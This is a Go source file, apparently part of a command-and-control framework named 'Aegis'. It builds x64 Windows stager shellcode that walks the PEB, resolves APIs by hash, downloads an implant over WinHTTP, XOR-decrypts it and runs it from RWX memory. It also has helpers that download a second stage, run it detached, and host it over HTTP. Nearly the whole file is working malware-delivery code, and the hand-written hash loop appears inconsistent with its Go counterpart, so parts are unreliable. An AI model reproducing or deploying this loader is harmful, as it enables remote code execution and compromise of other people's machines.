// Package stage 提供分阶段 Payload 支持。
// 借鉴 Sliver 的 Staged Payload — 先加载小型 Stage 0 (stager)，再由 stager 下载完整 implant。
package stage

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"sync"
)

// DJB2Hash 计算 djb2 哈希（用于测试验证）。
func DJB2Hash(s string) uint32 {
	var h uint32 = 5381
	for i := 0; i < len(s); i++ {
		h = ((h << 5) + h) + uint32(s[i])
	}
	return h
}

// djb2Hash is the internal alias for test compatibility.
var djb2Hash = DJB2Hash

// StageType 定义 Payload 阶段类型。
type StageType string

const (
	Stage0Stager  StageType = "stager"
	Stage1Implant StageType = "implant"
	StageFull     StageType = "stageless"
)

// StageConfig 是分阶段 Payload 的配置。
type StageConfig struct {
	Type      StageType
	ServerURL string
	PayloadID string
	AESKey    []byte
	Checksum  string
}

// GenerateStage0 生成 Stage 0 (stager) shellcode。
// Stager 执行流程：
//  1. PEB 遍历 → kernel32 导出表 → hash-based API 解析
//  2. LoadLibraryA("winhttp.dll")
//  3. WinHttpOpen → Connect → OpenRequest → SendRequest → ReceiveResponse
//  4. WinHttpReadData 循环下载
//  5. XOR-128 解密（16 字节密钥流式 XOR）
//  6. VirtualAlloc(RWX) → memcpy → call entry
func GenerateStage0(config *StageConfig) ([]byte, error) {
	if len(config.AESKey) < 16 {
		return nil, fmt.Errorf("AES key must be at least 16 bytes, got %d", len(config.AESKey))
	}

	serverName, urlPath, port, err := parseURL(config.ServerURL)
	if err != nil {
		return nil, fmt.Errorf("parse URL: %w", err)
	}

	stagePath := "/stage/" + config.PayloadID
	fullPath := urlPath + stagePath

	serverWide := toWideString(serverName)
	pathWide := toWideString(fullPath)
	aesKey128 := make([]byte, 16)
	copy(aesKey128, config.AESKey[:16])

	shellcode, err := buildStagerShellcode(serverWide, pathWide, uint16(port), aesKey128)
	if err != nil {
		return nil, fmt.Errorf("build shellcode: %w", err)
	}

	h := sha256.Sum256(shellcode)
	config.Checksum = hex.EncodeToString(h[:])

	return shellcode, nil
}

// stagerBuilder 分两阶段构建 shellcode：先收集代码段和引用标记，
// 然后计算数据段偏移、patch 代码、追加数据段。
type stagerBuilder struct {
	code []byte
	// 每个引用标记记录：代码中的位置和引用标签
	refs []ref
}

type ref struct {
	pos int    // code 中 4-byte immediate 的起始偏移
	tag string // 数据标签名
}

func (b *stagerBuilder) emit(bs ...byte) {
	b.code = append(b.code, bs...)
}

// emitLea 生成 lea reg, [rbp+disp32]，disp32 初始为 0，注册引用。
func (b *stagerBuilder) emitLea(reg byte, tag string) {
	// reg encoding in ModRM for [rbp+disp32]: mod=10(2), rm=101(5)
	// reg field: 000=rax,001=rcx,010=rdx,011=rbx,100=rsp,101=rbp,110=rsi,111=rdi
	// With REX.W=0x48: r8-r15 need REX.B=1
	var rex, modrm byte
	switch reg {
	case 0: // rax
		rex, modrm = 0x48, 0x85 // 10 000 101
	case 1: // rcx
		rex, modrm = 0x48, 0x8D // 10 001 101
	case 2: // rdx
		rex, modrm = 0x48, 0x95 // 10 010 101
	case 3: // rbx
		rex, modrm = 0x48, 0x9D // 10 011 101
	case 6: // rsi
		rex, modrm = 0x48, 0xB5 // 10 110 101
	case 7: // rdi
		rex, modrm = 0x48, 0xBD // 10 111 101
	case 8: // r8
		rex, modrm = 0x4C, 0x85 // REX.W|B=1, mod=10 reg=000 rm=101
	case 9: // r9
		rex, modrm = 0x4C, 0x8D
	case 10: // r10
		rex, modrm = 0x4C, 0x95
	case 11: // r11
		rex, modrm = 0x4C, 0x9D // REX.W|R=1, mod=10 reg=011(r11) rm=101(rbp)
	}
	b.emit(rex, 0x8D, modrm, 0x00, 0x00, 0x00, 0x00)
	b.refs = append(b.refs, ref{pos: len(b.code) - 4, tag: tag})
}

// buildStagerShellcode 构建完整 stager。
func buildStagerShellcode(serverWide, pathWide []byte, port uint16, aesKey128 []byte) ([]byte, error) {
	b := &stagerBuilder{code: make([]byte, 0, 2048)}

	apiNames := []string{
		"VirtualAlloc", "VirtualProtect", "LoadLibraryA", "GetProcAddress",
		"WinHttpOpen", "WinHttpConnect", "WinHttpOpenRequest",
		"WinHttpSendRequest", "WinHttpReceiveResponse", "WinHttpCloseHandle",
		"WinHttpReadData",
	}
	apiHashes := []uint32{
		0x382C0F97, 0x844FF18D, 0x5FBFF0FB, 0xCF31BB1F,
		0x5E4F39E5, 0x7242C17D, 0xEAB7B9CE,
		0xB183FAA6, 0x146C4925, 0x36220CD5,
		0xE593B0E2,
	}
	numAPIs := len(apiNames)

	// ======= Prologue =======
	b.emit(
		0x55,                   // push rbp
		0x53,                   // push rbx
		0x56,                   // push rsi
		0x57,                   // push rdi
		0x41, 0x50,             // push r8
		0x41, 0x51,             // push r9
		0x41, 0x52,             // push r10
		0x41, 0x53,             // push r11
		0x41, 0x54,             // push r12
		0x41, 0x55,             // push r13
		0x41, 0x56,             // push r14
		0x41, 0x57,             // push r15
		0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
	)

	// ======= call/pop: get PC into rbp =======
	callPos := len(b.code)
	b.emit(
		0xE8, 0x00, 0x00, 0x00, 0x00, // call +5
		0x5D,                   // pop rbp
	)
	// After pop, rbp = callPos + 5. Data section starts at codeSize.
	// dataFromRbp = codeSize - (callPos+5)

	// ======= PEB → kernel32 base =======
	b.emit(
		0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, // mov rax, gs:[0x60] (PEB)
		0x48, 0x8B, 0x40, 0x18,       // mov rax, [rax+0x18] (PEB_LDR_DATA)
		0x48, 0x8B, 0x70, 0x10,       // mov rsi, [rax+0x10] (InLoadOrderModuleList)
		0x48, 0x8B, 0x36,             // mov rsi, [rsi] (next entry = ntdll)
		0x48, 0x8B, 0x36,             // mov rsi, [rsi] (next entry = kernel32)
		0x48, 0x8B, 0x5E, 0x30,       // mov rbx, [rsi+0x30] (DllBase)
	)

	// ======= Parse kernel32 export table =======
	b.emit(
		0x8B, 0x43, 0x3C,                         // mov eax, [rbx+0x3C] (e_lfanew)
		0x48, 0x01, 0xD8,                         // add rax, rbx
		0x48, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, // mov rax, [rax+0x88] (Export VA)
		0x48, 0x01, 0xD8,                         // add rax, rbx
		0x48, 0x89, 0xC6,                         // mov rsi, rax (export dir)

		0x8B, 0x46, 0x18, // mov eax, [rsi+0x18] (NumberOfNames)
		0x41, 0x89, 0xC0, // mov r8d, eax

		0x8B, 0x46, 0x20, // mov eax, [rsi+0x20] (AddressOfNames)
		0x48, 0x01, 0xD8, // add rax, rbx
		0x49, 0x89, 0xC4, // mov r12, rax

		0x8B, 0x46, 0x24, // mov eax, [rsi+0x24] (AddressOfNameOrdinals)
		0x48, 0x01, 0xD8, // add rax, rbx
		0x49, 0x89, 0xC5, // mov r13, rax

		0x8B, 0x46, 0x1C, // mov eax, [rsi+0x1C] (AddressOfFunctions)
		0x48, 0x01, 0xD8, // add rax, rbx
		0x49, 0x89, 0xC6, // mov r14, rax
	)

	// ======= API hash resolution =======
	// Hash table layout in data: 8 bytes per entry [hash:4][addr:4]
	// r12=AddressOfNames, r13=Ordinals, r14=Functions, rbx=kernel32, r8=NumberOfNames
	b.emit(
		0x4D, 0x31, 0xC9, // xor r9d, r9d (nameIndex)
	)
	nameLoop := len(b.code)

	b.emit(
		0x41, 0x85, 0xC0,                   // test r8d, r8d
		0x0F, 0x84, 0x00, 0x00, 0x00, 0x00, // je allNamesDone
	)
	jeAllNames := len(b.code) - 4

	b.emit(
		0x42, 0x8B, 0x04, 0x8C, // mov eax, [r12+r9*4]
		0x48, 0x01, 0xD8,       // add rax, rbx
		0x48, 0x89, 0xC7,       // mov rdi, rax (name ptr)

		0xBA, 0xD5, 0x14, 0x00, 0x00, // mov edx, 5381 (djb2 seed)
		0x48, 0x31, 0xC9,             // xor rcx, rcx (char index)
	)
	hashLoop := len(b.code)

	b.emit(
		0x0F, 0xB6, 0x04, 0x0C,       // movzx eax, byte [rdi+rcx]
		0x84, 0xC0,                   // test al, al
		0x74, 0x00,                   // je hashDone
		0xC1, 0xE2, 0x05,             // shl edx, 5
		0x01, 0xC2,                   // add edx, eax
		0x48, 0xFF, 0xC1,             // inc rcx
		0xEB, 0x00,                   // jmp hashLoop
	)
	b.code[len(b.code)-1] = byte(hashLoop - (len(b.code) - 1) - 1)

	hashDone := len(b.code)
	b.code[hashDone-5] = byte(hashDone - (hashDone - 5) - 1)

	// Compare against hash table
	b.emit(
		0x45, 0x31, 0xD2, // xor r10d, r10d (hashIndex)
	)
	compLoop := len(b.code)

	b.emit(
		0x41, 0x81, 0xFA, 0x00, 0x00, 0x00, 0x00, // cmp r10d, numAPIs
	)
	binary.LittleEndian.PutUint32(b.code[len(b.code)-4:], uint32(numAPIs))

	b.emit(
		0x0F, 0x8D, 0x00, 0x00, 0x00, 0x00, // jge nextName
	)
	jgeNextName := len(b.code) - 4

	// lea r11, [rbp+HASH_TABLE] — hash table base
	b.emitLea(11, "hash_table")

	// cmp edx, [r11+r10*8] (hash entry)
	b.emit(
		0x43, 0x39, 0x14, 0x53, // cmp [r11+r10*8], edx
		0x75, 0x00,             // jne nextHash
	)
	jneHash := len(b.code) - 1

	// Match: get ordinal and function address
	b.emit(
		// ordinal = word [r13+r9*2]
		0x42, 0x0F, 0xB7, 0x0C, 0x4D, // movzx rcx, word [r13+r9*2]
		// function RVA = dword [r14+rcx*4]
		0x42, 0x8B, 0x14, 0x8E,     // mov edx, [r14+rcx*4]
		0x48, 0x01, 0xD3,           // add rdx, rbx (→ absolute)
		0x43, 0x48, 0x89, 0x54, 0x53, 0x04, // mov [r11+r10*8+4], rdx
	)

	nextHash := len(b.code)
	b.code[jneHash] = byte(nextHash - jneHash - 1)

	b.emit(
		0x41, 0xFF, 0xC2,             // inc r10d
		0xE9, 0x00, 0x00, 0x00, 0x00, // jmp compLoop
	)
	binary.LittleEndian.PutUint32(b.code[len(b.code)-4:], uint32(compLoop)-uint32(len(b.code)))

	nextName := len(b.code)
	binary.LittleEndian.PutUint32(b.code[jgeNextName:], uint32(nextName)-uint32(jgeNextName+4))

	b.emit(
		0x41, 0xFF, 0xC1,             // inc r9d
		0x41, 0xFF, 0xC8,             // dec r8d
		0xE9, 0x00, 0x00, 0x00, 0x00, // jmp nameLoop
	)
	binary.LittleEndian.PutUint32(b.code[len(b.code)-4:], uint32(nameLoop)-uint32(len(b.code)))

	allDone := len(b.code)
	binary.LittleEndian.PutUint32(b.code[jeAllNames:], uint32(allDone)-uint32(jeAllNames+4))

	// ======= LoadLibraryA("winhttp.dll") =======
	// LoadLibraryA addr = hash_table[2*8+4] = hash_table[0x14]
	b.emit(
		0x49, 0x8B, 0x43, 0x14, // mov rax, [r11+0x14]
	)

	// lea rcx, [rbp+WINHTTP_DLL]
	b.emitLea(1, "winhttp_dll")

	b.emit(
		0x48, 0x83, 0xEC, 0x20, // sub rsp, 0x20
		0xFF, 0xD0,             // call rax
		0x48, 0x83, 0xC4, 0x20, // add rsp, 0x20
		0x49, 0x89, 0xC7,       // mov r15, rax (winhttp.dll base)
	)

	// ======= Resolve WinHTTP functions =======
	// GetProcAddress addr = hash_table[3*8+4] = hash_table[0x1C]
	b.emit(
		0x49, 0x8B, 0x43, 0x1C, // mov rax, [r11+0x1C]
	)

	// For each WinHTTP function (idx 4-10): GetProcAddress(winhttp, name)
	for idx := 4; idx <= 10; idx++ {
		b.emit(0x4C, 0x89, 0xF9) // mov rcx, r15

		// lea rdx, [rbp+API_NAME_<idx>]
		b.emitLea(2, fmt.Sprintf("api_name_%d", idx))

		b.emit(
			0x48, 0x83, 0xEC, 0x20,
			0xFF, 0xD0,
			0x48, 0x83, 0xC4, 0x20,
		)

		// Store at hash_table[idx*8+4]
		storeOff := idx*8 + 4
		if storeOff < 0x80 {
			b.emit(0x41, 0x48, 0x89, 0x43, byte(storeOff))
		} else {
			b.emit(0x41, 0x48, 0x89, 0x83)
			ob := make([]byte, 4)
			binary.LittleEndian.PutUint32(ob, uint32(storeOff))
			b.emit(ob...)
		}
	}

	// ======= WinHttpOpen(L"Aegis", 0, NULL, NULL, 0) =======
	// lea rcx, [rbp+USER_AGENT]
	b.emitLea(1, "user_agent")

	b.emit(
		0xBA, 0x00, 0x00, 0x00, 0x00, // mov edx, 0
		0x4D, 0x31, 0xC0,             // xor r8d, r8d
		0x4D, 0x31, 0xC9,             // xor r9d, r9d
		0x6A, 0x00,                   // push 0
		0x48, 0x83, 0xEC, 0x20,       // sub rsp, 0x20
		// WinHttpOpen = hash_table[4*8+4] = hash_table[0x24]
		0x49, 0x8B, 0x43, 0x24, // mov rax, [r11+0x24]
		0xFF, 0xD0,             // call rax
		0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
		0x49, 0x89, 0xC7,       // mov r15, rax (hSession)
	)

	// ======= WinHttpConnect(hSession, serverWide, port, 0) =======
	b.emit(
		0x4C, 0x89, 0xF9, // mov rcx, r15
	)
	b.emitLea(2, "server") // lea rdx, [rbp+SERVER]

	b.emit(
		0x41, 0xB8, 0x00, 0x00, 0x00, 0x00, // mov r8d, port — patch below
	)
	portValOff := len(b.code) - 4

	b.emit(
		0x4D, 0x31, 0xC9, // xor r9d, r9d
		0x48, 0x83, 0xEC, 0x20,
		// WinHttpConnect = hash_table[5*8+4] = hash_table[0x2C]
		0x49, 0x8B, 0x43, 0x2C,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x20,
		0x49, 0x89, 0xC6, // mov r14, rax (hConnect)
	)
	binary.LittleEndian.PutUint16(b.code[portValOff:], port)

	// ======= WinHttpOpenRequest(hConnect, NULL, pathWide, NULL, NULL, NULL, 0) =======
	b.emit(
		0x4C, 0x89, 0xF1,       // mov rcx, r14
		0x48, 0x31, 0xD2,       // xor rdx, rdx (NULL method)
	)
	b.emitLea(8, "path")        // lea r8, [rbp+PATH]

	b.emit(
		0x4D, 0x31, 0xC9,       // xor r9d, r9d (NULL)
		0x6A, 0x00, 0x6A, 0x00, // push 0, push 0 (dwFlags, dwReserved)
		0x6A, 0x00,             // push 0 (reserved)
		0x48, 0x83, 0xEC, 0x20, // sub rsp, 0x20
		// WinHttpOpenRequest = hash_table[6*8+4] = hash_table[0x34]
		0x49, 0x8B, 0x43, 0x34,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x38,
		0x49, 0x89, 0xC5, // mov r13, rax (hRequest)
	)

	// ======= WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) =======
	b.emit(
		0x4C, 0x89, 0xE9,       // mov rcx, r13
		0x48, 0x31, 0xD2,       // xor rdx, rdx
		0x45, 0x31, 0xC0,       // xor r8d, r8d
		0x4D, 0x31, 0xC9,       // xor r9d, r9d
		0x6A, 0x00, 0x6A, 0x00, // push 0, push 0
		0x6A, 0x00,             // push 0
		0x48, 0x83, 0xEC, 0x20,
		// WinHttpSendRequest = hash_table[7*8+4] = hash_table[0x3C]
		0x49, 0x8B, 0x43, 0x3C,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x38,
	)

	// ======= WinHttpReceiveResponse(hRequest, NULL) =======
	b.emit(
		0x4C, 0x89, 0xE9, // mov rcx, r13
		0x48, 0x31, 0xD2, // xor rdx, rdx
		0x48, 0x83, 0xEC, 0x20,
		// WinHttpReceiveResponse = hash_table[8*8+4] = hash_table[0x44]
		0x49, 0x8B, 0x43, 0x44,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x20,
	)

	// ======= VirtualAlloc for download buffer =======
	b.emit(
		// VirtualAlloc = hash_table[0*8+4] = hash_table[0x04]
		0x49, 0x8B, 0x43, 0x04,
		0x48, 0x31, 0xC9, 0x48, 0x89, 0xCB,     // rcx = NULL
		0x48, 0xC7, 0xC2, 0x00, 0x00, 0x10, 0x00, // rdx = 0x100000 (1MB)
		0x41, 0xB8, 0x00, 0x30, 0x00, 0x00,     // r8 = MEM_COMMIT|MEM_RESERVE
		0x41, 0xB9, 0x04, 0x00, 0x00, 0x00,     // r9 = PAGE_READWRITE
		0x48, 0x83, 0xEC, 0x20,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x20,
		0x49, 0x89, 0xC4, // mov r12, rax (download buffer)
		0x48, 0x85, 0xC0, // test rax, rax
		0x0F, 0x84, 0x00, 0x00, 0x00, 0x00, // je decryptStage
	)
	jeAlloc := len(b.code) - 4

	// ======= Resolve WinHttpReadData =======
	b.emit(
		0x49, 0x8B, 0x43, 0x1C, // mov rax, [r11+0x1C] (GetProcAddress)
		0x4C, 0x89, 0xF9,       // mov rcx, r15 (winhttp.dll)
	)
	b.emitLea(2, "api_name_10") // lea rdx, [rbp+WinHttpReadData name]

	b.emit(
		0x48, 0x83, 0xEC, 0x20,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x20,
		0x49, 0x89, 0xC3, // mov r11, rax (WinHttpReadData)
	)

	// ======= Download loop =======
	b.emit(
		0x4D, 0x31, 0xD2, // xor r10d, r10d (totalBytesRead)
	)
	dlLoop := len(b.code)

	b.emit(
		0x4C, 0x89, 0xE9,                     // mov rcx, r13 (hRequest)
		0x49, 0x8D, 0x14, 0x12,               // lea rdx, [r12+r10] (buffer+total)
		0x41, 0xB8, 0x00, 0x10, 0x00, 0x00,   // mov r8d, 4096
		0x4C, 0x8D, 0x4C, 0x24, 0x30,         // lea r9, [rsp+0x30] (bytesRead ptr)
		0x48, 0x83, 0xEC, 0x40,               // sub rsp, 0x40
		0x41, 0xFF, 0xD3,                     // call r11
		0x48, 0x83, 0xC4, 0x40,               // add rsp, 0x40
		0x8B, 0x44, 0x24, 0x30,               // mov eax, [rsp+0x30]
		0x85, 0xC0,                           // test eax, eax
		0x0F, 0x84, 0x00, 0x00, 0x00, 0x00,   // je decryptStage
	)
	jeDecrypt := len(b.code) - 4

	b.emit(
		0x41, 0x01, 0xC2,             // add r10d, eax
		0xE9, 0x00, 0x00, 0x00, 0x00, // jmp dlLoop
	)
	binary.LittleEndian.PutUint32(b.code[len(b.code)-4:], uint32(dlLoop)-uint32(len(b.code)))

	// ======= XOR-128 Decryption =======
	decryptStage := len(b.code)
	binary.LittleEndian.PutUint32(b.code[jeDecrypt:], uint32(decryptStage)-uint32(jeDecrypt+4))
	binary.LittleEndian.PutUint32(b.code[jeAlloc:], uint32(decryptStage)-uint32(jeAlloc+4))

	b.emit(
		0x4D, 0x31, 0xC9, // xor r9d, r9d (blockOffset)
	)
	xorLoop := len(b.code)

	b.emit(
		0x45, 0x39, 0xD1,             // cmp r9d, r10d
		0x0F, 0x8D, 0x00, 0x00, 0x00, 0x00, // jge executeStage
	)
	jgeExecute := len(b.code) - 4

	// lea rsi, [rbp+AES_KEY]
	b.emitLea(6, "aes_key")

	// lea rdi, [r12+r9] (buffer+offset)
	b.emit(0x4B, 0x8D, 0x3C, 0x0C)

	// XOR 16 bytes (2 qwords)
	b.emit(
		0x48, 0x8B, 0x06,       // mov rax, [rsi]
		0x48, 0x33, 0x07,       // xor rax, [rdi]
		0x48, 0x89, 0x07,       // mov [rdi], rax
		0x48, 0x8B, 0x46, 0x08, // mov rax, [rsi+8]
		0x48, 0x33, 0x47, 0x08, // xor rax, [rdi+8]
		0x48, 0x89, 0x47, 0x08, // mov [rdi+8], rax

		0x41, 0x83, 0xC1, 0x10, // add r9d, 16
		0xE9, 0x00, 0x00, 0x00, 0x00, // jmp xorLoop
	)
	binary.LittleEndian.PutUint32(b.code[len(b.code)-4:], uint32(xorLoop)-uint32(len(b.code)))

	// ======= Execute: VirtualAlloc(RWX) → memcpy → call =======
	executeStage := len(b.code)
	binary.LittleEndian.PutUint32(b.code[jgeExecute:], uint32(executeStage)-uint32(jgeExecute+4))

	b.emit(
		// VirtualAlloc = hash_table[0x04]
		0x49, 0x8B, 0x43, 0x04,
		0x48, 0x31, 0xC9, 0x48, 0x89, 0xCB, // rcx = NULL
		0x4C, 0x89, 0xD2,                   // rdx = r10 (size)
		0x41, 0xB8, 0x00, 0x30, 0x00, 0x00, // r8 = MEM_COMMIT|MEM_RESERVE
		0x41, 0xB9, 0x40, 0x00, 0x00, 0x00, // r9 = PAGE_EXECUTE_READWRITE
		0x48, 0x83, 0xEC, 0x20,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x20,
		0x49, 0x89, 0xC3, // mov r11, rax (exec buffer)
		0x48, 0x85, 0xC0, // test rax, rax
		0x0F, 0x84, 0x00, 0x00, 0x00, 0x00, // je epilogue
	)
	jeEpilogue := len(b.code) - 4

	// memcpy: rep movsb
	b.emit(
		0x4C, 0x89, 0xDE, // mov rsi, r12 (source)
		0x4C, 0x89, 0xDF, // mov rdi, r11 (dest)
		0x4C, 0x89, 0xD1, // mov rcx, r10 (count)
		0xF3, 0xA4,       // rep movsb

		0x41, 0xFF, 0xD3, // call r11
	)

	epilogueStart := len(b.code)
	binary.LittleEndian.PutUint32(b.code[jeEpilogue:], uint32(epilogueStart)-uint32(jeEpilogue+4))

	// ======= Epilogue =======
	b.emit(
		0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
		0x41, 0x5F, // pop r15
		0x41, 0x5E, // pop r14
		0x41, 0x5D, // pop r13
		0x41, 0x5C, // pop r12
		0x41, 0x5B, // pop r11
		0x41, 0x5A, // pop r10
		0x41, 0x59, // pop r9
		0x41, 0x58, // pop r8
		0x5F, // pop rdi
		0x5E, // pop rsi
		0x5B, // pop rbx
		0x5D, // pop rbp
		0xC3, // ret
	)

	// ======= Phase 2: Compute data offsets and patch =======
	codeSize := len(b.code)
	dataFromRbp := int32(codeSize) - int32(callPos+5)

	// NOTE: The call instruction at callPos is E8 00 00 00 00 (call +0).
	// This correctly jumps to pop rbp at callPos+5. DO NOT patch it —
	// the call must jump to pop rbp, not to the data section.
	// dataFromRbp is only used for LEA [rbp+disp] references.

	// Build data section and compute offsets
	type dataSeg struct {
		label string
		data  []byte
	}

	var segments []dataSeg
	offset := int32(0)

	addSeg := func(label string, data []byte) int32 {
		off := offset
		segments = append(segments, dataSeg{label, data})
		offset += int32(len(data))
		return off
	}

	serverOff := addSeg("server", serverWide)
	pathOff := addSeg("path", pathWide)

	portBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(portBuf, port)
	portOff := addSeg("port", portBuf)

	aesKeyOff := addSeg("aes_key", aesKey128)

	// Hash table: 8 bytes per entry × 11 = 88 bytes
	hashTable := make([]byte, 88)
	for i := 0; i < numAPIs; i++ {
		binary.LittleEndian.PutUint32(hashTable[i*8:], apiHashes[i])
		// addr field (offset 4) starts as 0, filled during resolution
	}
	hashTableOff := addSeg("hash_table", hashTable)

	winhttpWide := toWideString("winhttp.dll")
	winhttpOff := addSeg("winhttp_dll", winhttpWide)

	// API name strings
	apiNameOffs := make(map[string]int32)
	for idx := 4; idx <= 10; idx++ {
		name := apiNames[idx]
		off := addSeg("api_name_"+string(rune('0'+idx)), []byte(name+string(rune(0))))
		apiNameOffs[fmt.Sprintf("api_name_%d", idx)] = off
	}

	userAgentWide := toWideString("Aegis")
	userAgentOff := addSeg("user_agent", userAgentWide)

	// Resolve ref → offset map
	refOff := map[string]int32{
		"server":        serverOff,
		"path":          pathOff,
		"port":          portOff,
		"aes_key":       aesKeyOff,
		"hash_table":    hashTableOff,
		"winhttp_dll":   winhttpOff,
		"user_agent":    userAgentOff,
	}
	for k, v := range apiNameOffs {
		refOff[k] = v
	}

	// Patch all references
	for _, r := range b.refs {
		val := dataFromRbp + refOff[r.tag]
		binary.LittleEndian.PutUint32(b.code[r.pos:], uint32(val))
	}

	// Append data section
	for _, seg := range segments {
		b.code = append(b.code, seg.data...)
	}

	return b.code, nil
}

// parseURL 解析 URL 为 server name, path, port。
func parseURL(rawURL string) (string, string, int, error) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return "", "", 0, err
	}

	host := u.Hostname()
	path := u.Path
	if path == "" {
		path = "/"
	}

	port := 80
	if u.Scheme == "https" {
		port = 443
	}
	if p := u.Port(); p != "" {
		port, _ = strconv.Atoi(p)
	}

	return host, path, port, nil
}

// toWideString 将 ASCII 字符串转换为 wide string（UTF-16LE，null 终止）。
func toWideString(s string) []byte {
	w := make([]byte, 0, len(s)*2+2)
	for _, c := range s {
		w = append(w, byte(c), 0)
	}
	w = append(w, 0, 0)
	return w
}

// GenerateStage1 生成 Stage 1 (implant)。
// 使用 XOR-128 加密（与 Stage0 shellcode 的解密逻辑匹配）。
func GenerateStage1(config *StageConfig, implant []byte) ([]byte, error) {
	if len(config.AESKey) < 16 {
		return nil, fmt.Errorf("key must be at least 16 bytes, got %d", len(config.AESKey))
	}

	encrypted := xor128Encrypt(implant, config.AESKey[:16])

	h := sha256.Sum256(encrypted)
	config.Checksum = hex.EncodeToString(h[:])

	return encrypted, nil
}

// aesGCMEncrypt encrypts plaintext using AES-GCM with a random nonce.
// Output format: nonce (12 bytes) + ciphertext + auth tag (16 bytes).
func aesGCMEncrypt(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	// Seal appends ciphertext + auth tag to nonce
	return aesGCM.Seal(nonce, nonce, plaintext, nil), nil
}

// aesGCMDecrypt decrypts AES-GCM encrypted data.
// Input format: nonce (12 bytes) + ciphertext + auth tag (16 bytes).
func aesGCMDecrypt(ciphertext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := aesGCM.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, encrypted := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return aesGCM.Open(nil, nonce, encrypted, nil)
}

// xor128Encrypt 使用 XOR-128 加密数据（16 字节密钥循环 XOR，补齐到 16 字节倍数）。
func xor128Encrypt(plaintext, key []byte) []byte {
	// 补齐到 16 字节倍数
	padLen := 16 - len(plaintext)%16
	if padLen == 16 && len(plaintext) == 0 {
		padLen = 0
	}
	padded := make([]byte, len(plaintext)+padLen)
	copy(padded, plaintext)
	for i := len(plaintext); i < len(padded); i++ {
		padded[i] = byte(padLen)
	}

	encrypted := make([]byte, len(padded))
	for i := range encrypted {
		encrypted[i] = padded[i] ^ key[i%16]
	}
	return encrypted
}

// xor128Decrypt 使用 XOR-128 解密数据（对称操作，去除填充）。
func xor128Decrypt(ciphertext, key []byte) []byte {
	decrypted := make([]byte, len(ciphertext))
	for i := range decrypted {
		decrypted[i] = ciphertext[i] ^ key[i%16]
	}

	// 去除 PKCS7-style padding
	if len(decrypted) > 0 {
		padLen := int(decrypted[len(decrypted)-1])
		if padLen >= 1 && padLen <= 16 {
			// Verify padding is consistent
			valid := true
			for i := len(decrypted) - padLen; i < len(decrypted)-1; i++ {
				if decrypted[i] != byte(padLen) {
					valid = false
					break
				}
			}
			if valid {
				return decrypted[:len(decrypted)-padLen]
			}
		}
	}
	return decrypted
}

// StageLoader 从 Server 加载 Stage 1。
type StageLoader struct {
	config    *StageConfig
	transport *http.Transport
}

func NewStageLoader(config *StageConfig) *StageLoader {
	return &StageLoader{config: config}
}

func (s *StageLoader) WithTransport(t *http.Transport) *StageLoader {
	s.transport = t
	return s
}

func (s *StageLoader) DownloadStage1() ([]byte, error) {
	u := s.config.ServerURL + "/stage/" + s.config.PayloadID

	client := &http.Client{}
	if s.transport != nil {
		client.Transport = s.transport
	}

	resp, err := client.Get(u)
	if err != nil {
		return nil, fmt.Errorf("HTTP GET %s: %w", u, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d from %s", resp.StatusCode, u)
	}

	encrypted, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response body: %w", err)
	}

	h := sha256.Sum256(encrypted)
	checksum := hex.EncodeToString(h[:])
	if checksum != s.config.Checksum {
		return nil, fmt.Errorf("checksum mismatch: expected %s, got %s", s.config.Checksum, checksum)
	}

	if len(s.config.AESKey) < 16 {
		return nil, fmt.Errorf("key too short: %d bytes", len(s.config.AESKey))
	}
	// XOR-128 解密（与 GenerateStage1 匹配）
	decrypted := xor128Decrypt(encrypted, s.config.AESKey[:16])

	return decrypted, nil
}

func ExecuteStage1(stage1 []byte) error {
	if len(stage1) == 0 {
		return fmt.Errorf("empty stage1")
	}

	tmpDir, err := os.MkdirTemp("", "aegis-stage1")
	if err != nil {
		return fmt.Errorf("create temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	exePath := filepath.Join(tmpDir, "stage1.exe")
	if err := os.WriteFile(exePath, stage1, 0700); err != nil {
		return fmt.Errorf("write stage1: %w", err)
	}

	cmd := exec.Command(exePath)
	cmd.Stdout = os.Stderr
	cmd.Stderr = os.Stderr
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("execute stage1: %w", err)
	}
	// Don't wait — stage1 runs independently
	return nil
}

// WebsiteHost 提供简单的 HTTP 服务来托管 staged payload。
type WebsiteHost struct {
	Port     int
	Path     string
	Stage1   []byte
	Checksum string
	mu       sync.RWMutex
	srv      *http.Server
	ErrCh    chan error
}

func (w *WebsiteHost) Start() error {
	addr := fmt.Sprintf(":%d", w.Port)
	mux := http.NewServeMux()
	mux.HandleFunc(w.Path, w.handlePayload)
